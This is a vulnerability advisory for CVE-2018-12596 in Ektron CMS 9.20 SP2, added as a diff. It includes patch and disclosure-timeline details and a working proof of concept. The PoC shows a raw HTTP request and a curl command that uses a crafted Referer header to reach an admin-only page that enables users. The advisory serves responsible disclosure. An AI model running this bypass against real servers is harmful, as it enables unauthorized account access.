@@ -1,0 +1,112 @@
+Details
+================
+Software: Ektron Content Management System (CMS)
+Version: 9.20 SP2
+Homepage: https://www.episerver.com
+Advisory report: https://github.com/alt3kx/CVE-2018-12596
+CVE: CVE-2018-12596
+CVSS: 7.5 (HIGH: (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
+CWE-284
+
+Description
+================
+Ektron CMS 9.20 SP2 allows remote attackers to enable users.
+
+Vulnerability
+================
+Ektron CMS 9.20 SP2 allows remote attackers to call aspx pages via the "activateuser.aspx" page, even if a page
+is located under the /WorkArea/ path, which is forbidden (normally available exclusively for local admins).
+
+Proof of concept Exploit
+========================
+
+Pre-requisites:
+
+- curl command deployed (Windows or Linux)
+- Burpsuite Free/Pro deployed or any other WebProxy to catch/send GET request
+
+Step (1): Launch the BurpSuite with default paramenter then request the follwing URL:
+
+Target: https://ektronserver.com/WorkArea/activateuser.aspx
+
+Normally you will see a 403 Forbidden: Access denied.
+
+Step (2): Into BurpSuite Free/Pro add the following extra Header Referer:
+
+"Referer: ALEX;"
+
+Step (3): The offending GET request is:
+
+GET /WorkArea/activateuser.aspx HTTP/1.1
+Host: ektronserver.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0
+Referer: ALEX;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+
+Step (4): Test your GET request using curl command and burpsuite as following:
+
+# curl -i -s -k -XGET "https://ektronserver.com/WorkArea/activateuser.aspx"
+-H "Host: ektronserver.com"
+-H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0"
+-H "Referer: ALEX;"
+-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+-H "Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate"
+-H "Connection: close"
+--proxy http://127.0.0.1:8080
+
+You should see now the following response 200 OK!:
+
+HTTP/1.0 200 Connection established
+
+HTTP/1.1 200 OK
+Cache-Control: private
+Content-Type: text/html; charset=utf-8
+
+Now you got access to enable users, just send the repeat request into the browser using burpsuite
+
+Have fun!
+
+Mitigations
+================
+Install the latest patches available here:
+
+PATCH ID: EKTR-508: Security enhancement for re-enabling a user
+https://support.episerver.com/hc/en-us/articles/115002828112-9-2-SP2-Site-Update
+
+Any of the below should fix CVE-2018-12596
+
+9.3(main release)
+9.2 SP2 Site CU 22
+9.1 SP3 Site CU 45
+9.0 SP3 Site CU 31
+
+Disclosure policy
+================
+We believes in responsible disclosure.
+Please contact us on Alex Hernandez aka alt3kx  (at) protonmail com to acknowledge this report.
+
+This vulnerability will be published if we do not receive a response to this report with 10 days.
+
+Timeline
+================
+2018–06–08: Discovered
+2018–06–11: Retest staging environment
+2018–06–12: Restes live environment
+2018–06–19: Internal communication
+2018–06–21: Vendor notification
+2018–06–21: Vendor feedback
+2018–06–29: Vendor feedback product will be patched
+2018–06–29: Patch available
+2018–06–29: Agrements with the vendor to publish the CVE/Advisory.
+2018–07–30: Internal communication
+2018–09–15: Patches tested on LAB environment.
+2018–10–08: Public report
+
+Discovered by:
+Alex Hernandez aka alt3kx:
+================
+Please visit https://github.com/alt3kx for more information.
+My current exploit list @exploit-db: https://www.exploit-db.com/author/?a=1074
